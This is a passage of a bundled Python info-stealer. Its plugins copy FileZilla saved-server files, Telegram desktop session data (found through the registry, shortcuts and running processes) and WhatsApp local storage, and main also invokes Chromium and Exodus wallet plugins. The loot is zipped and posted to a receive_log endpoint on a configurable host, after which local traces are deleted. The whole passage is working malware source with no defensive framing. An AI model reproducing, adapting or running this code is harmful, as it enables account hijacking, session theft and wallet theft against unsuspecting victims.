self.conf.logger.log(f'\xd0\x9e\xd1\x82\xd1\x81\xd1\x82\xd1\x83\xd0\xba \xd0\xbe\xd1\x82\xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd')\r\n\r\n        await bg_task")
    __stickytape_write_module('plugins/Filezilla.py', b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile\r\n\r\n\r\n\r\nclass Filezilla(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        search = {'recentservers.xml', 'sitemanager.xml'}\r\n        files = search.intersection(i.name for i in scandir(path))\r\n\r\n        if not files:\r\n            return\r\n\r\n        res_path = join(self.conf.log_path, 'filezilla')\r\n        if not isdir(res_path):\r\n            mkdir(res_path)\r\n        \r\n        for f in files:\r\n            filename = f.split('.')[0]\r\n            dest_path = join(res_path, f'{filename}_{token_hex(4)}.xml')\r\n            await copyfile(join(path, f), dest_path)\r\n\r\n        await self.conf.logger.log(f'Filezilla stealed from {path}')")
    __stickytape_write_module('plugins/Telegram.py', b'from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join, normpath\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile, copytree\r\nimport winreg\r\nimport re\r\nfrom paths import LOCAL\r\nimport win32com.client\r\nimport psutil\r\nfrom os.path import split\r\n\r\n\r\n\r\nclass Telegram(Plugin):\r\n    STEALED = set()\r\n\r\n\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self, path: str) -> None:\r\n        path_ = normpath(path.lower())\r\n        if path_ in Telegram.STEALED:\r\n            return\r\n        else:\r\n            Telegram.STEALED.add(path_)\r\n        \r\n        if not isdir(path):\r\n            return\r\n\r\n        tdata_path = join(path, \'tdata\')\r\n        if not isdir(tdata_path):\r\n            return\r\n\r\n        telegram_path = join(self.conf.log_path, \'telegram\')\r\n        if not isdir(telegram_path):\r\n            mkdir(telegram_path)\r\n\r\n        res_path = join(telegram_path, f\'tdata_{token_hex(4)}\')\r\n        mkdir(res_path)\r\n\r\n        blacklist = [\'dumps\', \'emoji\', \'user_data\', \'working\']\r\n\r\n        for f in scandir(tdata_path):\r\n            file_ok = True\r\n            for i in blacklist:\r\n                if i in f.name:\r\n                    file_ok = False\r\n                    break\r\n            \r\n            if not file_ok:\r\n                continue\r\n            \r\n            from_path = join(tdata_path, f.name)\r\n            dest_path = join(res_path, f.name)\r\n\r\n            func = copyfile if f.is_file() else copytree\r\n            await func(from_path, dest_path)\r\n\r\n        await self.conf.logger.log(f\'Telegram stealed from {path}\')\r\n\r\n    @staticmethod\r\n    def get_registry_path():\r\n        path = winreg.HKEY_CLASSES_ROOT\r\n\r\n        tg = winreg.OpenKeyEx(path, r"tdesktop.tg\\\\")\r\n        shell = winreg.OpenKeyEx(tg, r\'shell\\\\\')\r\n        open_rg = winreg.OpenKeyEx(shell, r\'open\\\\\')\r\n        key = winreg.OpenKeyEx(open_rg, r\'command\\\\\')\r\n\r\n        value = winreg.EnumValue(key, 0)\r\n\r\n        path = re.findall(r\'"([^"]*)\', value[1])[2]\r\n        return path\r\n        \r\n    @staticmethod\r\n    def get_lnk_path():\r\n        desktop = join(LOCAL, \'desktop\')\r\n\r\n        for it in scandir(desktop):\r\n            if it.name.split(\'.\')[-1] == \'lnk\' and \'telegram\' in it.name.lower():\r\n                shell = win32com.client.Dispatch("WScript.Shell")\r\n                shortcut = shell.CreateShortCut(it.path)\r\n                path = shortcut.Targetpath.lower().strip(\'telegram.exe\')\r\n                return path\r\n\r\n    @staticmethod\r\n    def get_telegrams():\r\n        for proc in psutil.process_iter():\r\n            if \'telegram\' in proc.name().lower():\r\n                try:\r\n                    yield split(proc.exe())[0]\r\n                except:\r\n                    pass')
    __stickytape_write_module('plugins/Whatsapp.py', b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copytree\r\n\r\n\r\n\r\nclass Whatsapp(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        folder = join(path, 'local storage', 'leveldb')\r\n\r\n        if not isdir(folder):\r\n            return\r\n        \r\n        whatsapp_res_folder = join(self.conf.log_path, 'whatsapp')\r\n\r\n        if not isdir(whatsapp_res_folder):\r\n            mkdir(whatsapp_res_folder)\r\n\r\n        res = join(whatsapp_res_folder, f'whatsapp_{token_hex(4)}')\r\n\r\n        await copytree(folder, res)\r\n\r\n        await self.conf.logger.log(f'Whatsapp stealed from {path}')")
    import asyncio
    from asyncio import create_task
    from typing import List
    from path_search import search_plugin_paths, root_paths
    from config import Config
    from aiohttp import ClientSession as Session
    import secrets
    import timeit
    from paths import TEMP
    from os import mkdir
    from os.path import join
    from zipfile import ZipFile, ZIP_DEFLATED
    from tools import zipdir, _handle_task_result
    from logger import Logger
    from os import scandir
    
    from plugins import Chromium, Details, Exodus, Filezilla, Telegram, Whatsapp
    
    
    
    HOST = 'http://127.0.0.1'
    
    
    async def main() -> None:
        start = timeit.default_timer()
    
        client_id = secrets.token_hex(10)
        log_path = join(TEMP, client_id)
    
        print(log_path)
        mkdir(log_path)
    
        tasks: List[asyncio.Task] = []
    
        session = Session()
        logger = Logger(log_path)
        conf = Config(client_id, HOST, log_path, logger, session, tag='xuy')
    
        await logger.log(f'Start')
        
        chromium = Chromium(conf)
        telegram = Telegram(conf)
    
        search_folder_names = {
            'google': chromium,
            'exodus': Exodus(conf),
            'mozilla': None,
            'telegram desktop': telegram,
            'telegram': Telegram(conf),
            'opera software': chromium,
            'filezilla': Filezilla(conf),
            'whatsapp': Whatsapp(conf)
        }
        
        tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names, logger)))
    
        other_plugins = [Details(conf)]
    
        for plugin in other_plugins:
            tasks.append(create_task(plugin.callback()))
    
        for task in tasks:
            task.add_done_callback(lambda x: _handle_task_result(x, logger))
    
        # Steal TG
        try:
            tg_path = Telegram.get_registry_path()
            await telegram.callback(tg_path)
        except Exception as e:
            await logger.log(f'Error when stealing telegram registry, {e}')
    
        try:
            tg_path2 = Telegram.get_lnk_path()
            if tg_path2:
                await telegram.callback(tg_path)
        except Exception as e:
            await logger.log(f'Error when stealing telegram lnk, {e}')
    
        try:
            for tg_path_ in Telegram.get_telegrams():
                try:
                    await telegram.callback(tg_path_)
                except Exception as e:
                    await logger.log(f'Telegram from psutil error, {e}')
        except Exception as e:
            await logger.log(f'Error when stealing telegrams proc, {e}')
        # End TG
    
        for task in tasks:
            try:
                await task
            except Exception as e:
                await logger.log(f'Error in main.py tasks {e}')
        
        await logger.log(f'  ')
    
        zip_log_path = join(TEMP, f'{client_id}.zip')
        with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:
            zipdir(log_path, zipf)
    
        files = {'file': open(zip_log_path, 'rb')}
            
        await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)
        await session.close()
    
        stop = timeit.default_timer()
        await logger.log(f'Time: {stop-start}')
    
        try:
            if 'DEBUG' not in {i.name for i in scandir(join(TEMP, '__pycache__'))}:
                from shutil import rmtree
                try:
                    rmtree(join(TEMP, '__pycache__'))
                except:
                    pass
                rmtree(log_path)
        except:
            pass
    
    asyncio.get_event_loop().run_until_complete(main())